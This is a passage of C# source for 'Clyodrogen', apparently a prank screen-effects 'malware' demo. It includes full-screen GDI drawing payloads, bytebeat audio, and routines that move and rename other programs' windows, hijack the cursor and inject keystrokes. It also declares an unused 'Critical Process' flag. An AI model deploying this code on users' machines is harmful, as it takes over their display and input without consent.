				RGB value = HSLToRGB(data);
				HSL data1 = new HSL(cod, 1f, 0.5f);
				RGB value1 = HSLToRGB(data1);
				HatchBrush sb = new HatchBrush(HatchStyle.DottedDiamond, Color.FromArgb(value.R, value.G, value.B), Color.Transparent);
				g.FillRectangle(sb, 0, 0, screenW, screenH);
				redrawCounter += 1;
				if (redrawCounter >= 360) { redrawCounter = 0; }
				if (codcod >= 360) { codcod = 0; }
			}
			catch { }
			Thread.Sleep(0);
		}
	}

	private class payload14 : Payloads
	{
		public override void Draw(IntPtr hdc)
		{
			int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
			PatBlt(hdc, 0, 0, x, y, CopyPixelOperation.PatInvert);
		}
	}

	private class payload15 : Payloads
	{
		public override void Draw(IntPtr hdc)
		{
			Random r = new Random();
			int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
			int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
			POINT[] lppoint = new POINT[3];
			lppoint[0].X = (left + 50) + 0;
			lppoint[0].Y = (top - 50) + 0;
			lppoint[1].X = (right + 50) + 0;
			lppoint[1].Y = (top + 50) + 0;
			lppoint[2].X = (left - 50) + 0;
			lppoint[2].Y = (bottom - 50) + 0;
			PlgBlt(hdc, lppoint, hdc, left - 20, top - 20, (right - left) + 40, (bottom - top) + 40, IntPtr.Zero, 0, 0);
			PatBlt(hdc, 0, 0, random.Next(screenW), random.Next(screenH), CopyPixelOperation.PatInvert);
			Thread.Sleep(0);
		}
	}

	private class payload16 : Payloads
	{
		public override void Draw(IntPtr hdc)
		{
			int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
			IntPtr hwnd = GetDesktopWindow();
			StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool SetForegroundWindow(IntPtr hWnd);
	[DllImport("user32.dll", EntryPoint = "SetWindowPos")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);
	const short SWP_NOMOVE = 0X2;
	const short SWP_NOSIZE = 1;
	const short SWP_NOZORDER = 0X4;
	const int SWP_SHOWWINDOW = 0x0040;
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

	[StructLayout(LayoutKind.Sequential)]
	public struct RECT
	{
		public int Left;        // x position of upper-left corner  
		public int Top;         // y position of upper-left corner  
		public int Right;       // x position of lower-right corner  
		public int Bottom;      // y position of lower-right corner  
	}
	[DllImport("user32.dll")]
	static extern IntPtr GetForegroundWindow();
	private class window : Payloads
	{
		private int redrawCounter;
		public override void Draw(IntPtr hdc)
		{
			Process myProcess = new Process();
			Process[] processes = Process.GetProcesses();
			foreach (var process in processes)
			{
				try
				{
					Console.WriteLine("Process Name: {0} ", process.ProcessName);

					IntPtr handle = process.MainWindowHandle;
					if (handle != IntPtr.Zero)
					{
						Random r = new Random();
						MoveWindow(handle, r.Next(1, screenW), r.Next(1, screenH), r.Next(1, screenW), r.Next(1, screenH), true);
						Thread.Sleep(random.Next(100, 5000));
					}
				}
				catch { }
			}
		}
	}

	public static Random r = new Random();
	private class curcrazy : Payloads
	{
		private int redrawCounter;
		private int codcod;
		private int ballWidth = 1;
		private int ballHeight = 1;
		private int ballPosX = Cursor.Position.X;
		private int ballPosY = Cursor.Position.Y;
		private int moveStepX = 1;
		private int moveStepY = 1;
		public override void Draw(IntPtr hdc)
		{

			Random r = new Random();
			int x = screenW;
			int y = screenH;
			Cursor.Position = new Point(ballPosX, ballPosY);
			ballPosX += moveStepX;
			if (
				ballPosX < 0 ||
				ballPosX + ballWidth > screenW
				)
			{
				moveStepX = -moveStepX;
			}

			ballPosY += moveStepY;
			if (
				ballPosY < 0 ||
				ballPosY + ballHeight > screenH
				)
			{
				moveStepY = -moveStepY;
			}
			if (redrawCounter >= 360) { redrawCounter = 0; }
			if (codcod >= 360) { codcod = 0; }
		}
	}
	[DllImport("user32.dll")]
	static extern bool SetWindowText(IntPtr hWnd, string text);
	private class windowtext : Payloads
	{
		private int redrawCounter;
		//hi if you use a decompiler: hi
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Process myProcess = new Process();
				Process[] processes = Process.GetProcesses();

				foreach (var process in processes)
				{

					Console.WriteLine("Process Name: {0} ", process.ProcessName);

					IntPtr handle = process.MainWindowHandle;
					if (handle != IntPtr.Zero)
					{
						Random r = new Random();
						SetWindowText(process.MainWindowHandle, "Clyodrogen.exe");
						Thread.Sleep(100);
						//
					}
				}
			}
			catch { }
		}
	}

	private class type : Payloads
	{
		private int redrawCounter;
		//hi if you use a decompiler: hi
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Random r = new Random();
				var chars = "clyodrogen ";
				var stringChars = new char[1];
				var random = new Random();

				for (int i = 0; i < stringChars.Length; i++)
				{
					stringChars[i] = chars[random.Next(chars.Length)];
				}
				var finalString = new String(stringChars);

				SendKeys.SendWait(finalString);
				Thread.Sleep(r.Next(10, 10000));
			}
			catch { }
		}
	}
	//payloads
	private abstract class Payloads
	{
		public bool running;
		public Random random = new Random();
		public int screenW = Screen.PrimaryScreen.Bounds.Width;
		public int screenH = Screen.PrimaryScreen.Bounds.Height;

		public void Start()
		{
			if (!running)
			{
				running = true;
				new Thread(DrawLoop).Start();
			}
		}

		public void Stop()
		{
			running = false;
		}

		private void DrawLoop()
		{
			while (running)
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Draw(dC);
				ReleaseDC(IntPtr.Zero, dC);
			}
		}

		public void Redraw()
		{
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
		}

		public abstract void Draw(IntPtr hdc);
	}

	[Flags]
	private enum RedrawWindowFlags : uint
	{
		Invalidate = 1u,
		InternalPaint = 2u,
		Erase = 4u,
		Validate = 8u,
		NoInternalPaint = 0x10u,
		NoErase = 0x20u,
		NoChildren = 0x40u,
		AllChildren = 0x80u,
		UpdateNow = 0x100u,
		EraseNow = 0x200u,
		Frame = 0x400u,
		NoFrame = 0x800u
	}

	private static void UselessForm()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run(new Form1());
	}

	private static void by1(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					(t >> 6 | t | t >> (t >> 16)) * 10 + ((t >> 11) & 7)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by2(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					(((t >> ((t >> 12) % 4)) + t * (1 + (1 + (t >> 16) % 6) * ((t >> 10)) * (t >> 11) % 8)) ^ (t >> 13)) ^ ((t >> 6))
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by3(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					t * (((t >> 9) ^ ((t >> 9) - 1) ^ 1) % 13)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by4(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					9 * t & t >> 4 | 5 * t & t >> 7 | 3 * t & t >> 10
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by5(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					t ^ t % 1001 + t ^ t % 1002
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by6(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					t * (3 + (1 ^ 5 & t >> 10)) * (5 + (3 & t >> 14)) >> (3 & t >> 8)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by7(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					20 * t * t * (t >> 11) / 7
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by8(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10) * t
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by9(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					2 * (t >> 5 & t) - (t >> 5) + t * (t >> 14 & 14)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by10(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 44100;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					t + (t & t >> 12) * t >> 8
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	private static void by11(int secs)
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = secs;

			var data = new byte[sample_rate * seconds];

			for (var t = 0; t < data.Length; t++)
				data[t] = (byte)(
					(t * t >> 1 * (t >> 8)) | (t * t >> (t >> 6)) & (t * t >> 7)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}

	public static int isCritical = 1;  // we want this to be a Critical Process
	public static int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
	[STAThread]
	public static void Main()
	{
		Payloads bb1 = new bb1();
		Payloads bb2 = new bb2();
		Payloads bb3 = new bb3();
		Payloads bb4 = new bb4();
		Payloads bb5 = new bb5();
		Payloads bb6 = new bb6();
		Payloads payload = new payload1();
		Payloads payload2 = new payload2();
		Payloads payload3 = new payload3();
		Payloads payload4 = new payload4();
		Payloads payload5 = new payload5();
		Payloads payload6 = new payload6();
		Payloads payload7 = new payload7();
		Payloads payload8 = new payload8();
		Payloads payload9 = new payload9();
		Payloads payload10 = new payload10();
		Payloads payload11 = new payload11();
		Payloads payload12 = new payload12();
		Payloads payload13 = new payload13();
		Payloads payload14 = new payload14();
		Payloads payload15 = new payload15();
		Payloads payload16 = new payload16();
		//Payloads window = new window();
		//Payloads type = new type();
		//Payloads cur = new curcrazy();
		//Payloads windowtext = new windowtext();
		if (MessageBox.Show("Run safety?", "Clyodrogen", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			if (MessageBox.Show("You sure?", "Clyodrogen", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				Thread.Sleep(5000);
				//window.Start();
				//type.Start();
				//cur.Start();
				//windowtext.Start();
				payload.Start();
				payload2.Start();
				by1(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload.Stop();
				payload2.Stop();
				payload10.Start();
				by9(30);
				payload10.Stop();
				payload3.Start();
				by3(30);
				payload3.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload4.Start();
				payload5.Start();
				payload.Start();
				Thread.Sleep(250);
				payload4.Stop();
				by6(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload5.Stop();
				payload.Stop();
				payload6.Start();
				payload7.Start();
				by5(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload6.Stop();
				payload7.Stop();
				payload8.Start();
				by8(30);
				payload8.Stop();
				payload.Start();
				payload2.Start();
				payload10.Start();
				payload6.Start();
				payload7.Start();
				payload9.Start();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				by10(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload.Stop();
				payload2.Stop();
				payload10.Stop();
				payload6.Stop();
				payload7.Stop();
				payload8.Stop();
				payload9.Start();
				payload12.Start();
				payload13.Start();
				by2(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload9.Stop();
				payload11.Stop();
				payload12.Start();
				payload3.Start();
				by9(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload12.Stop();
				payload3.Stop();
				payload13.Start();
				by8(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload13.Stop();
				payload14.Start();
				payload5.Start();
				by3(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload6.Start();
				payload15.Start();
				by9(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload14.Stop();
				payload5.Stop();
				payload.Start();
				payload2.Start();
				payload3.Start();
				payload4.Start();
				payload6.Start();
				payload7.Start();
				payload8.Start();
				payload9.Start();
				payload10.Start();
				payload11.Start();
				payload12.Start();
				payload13.Start();
				payload14.Start();
				payload15.Start();
				payload16.Start();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				by5(30);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				payload.Stop();
				payload2.Stop();
				payload3.Stop();
				payload4.Stop();
				payload6.Stop();
				payload7.Stop();
				payload8.Stop();
				payload9.Stop();
				payload10.Stop();
				payload11.Stop();
				payload12.Stop();
				payload13.Stop();
				payload14.Stop();
				payload15.Stop();
				payload16.Stop();
				Environment.Exit(0);
			}
		}
	}

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(uint crColor);

	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject([In] IntPtr hObject);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

	[DllImport("user32.dll")]
	private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

	[DllImport("gdi32.dll")]
	static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
TernaryRasterOperations dwRop);
	public enum TernaryRasterOperations
	{
		SRCCOPY = 0x00CC0020, // dest = source
		SRCPAINT = 0x00EE0086, // dest = source OR dest
		SRCAND = 0x008800C6, // dest = source AND dest
		SRCINVERT = 0x00660046, // dest = source XOR dest
		SRCERASE = 0x00440328, // dest = source AND (NOT dest)
		NOTSRCCOPY = 0x00330008, // dest = (NOT source)
		NOTSRCERASE = 0x001100A6, // dest = (NOT src) AND (NOT dest)
		MERGECOPY = 0x00C000CA, // dest = (source AND pattern)
		MERGEPAINT = 0x00BB0226, // dest = (NOT source) OR dest
		PATCOPY = 0x00F00021, // dest = pattern
		PATPAINT = 0x00FB0A09, // dest = DPSnoo
		PATINVERT = 0x005A0049, // dest = pattern XOR dest
		DSTINVERT = 0x00550009, // dest = (NOT dest)
		BLACKNESS = 0x00000042, // dest = BLACK
		WHITENESS = 0x00FF0062, // dest = WHITE
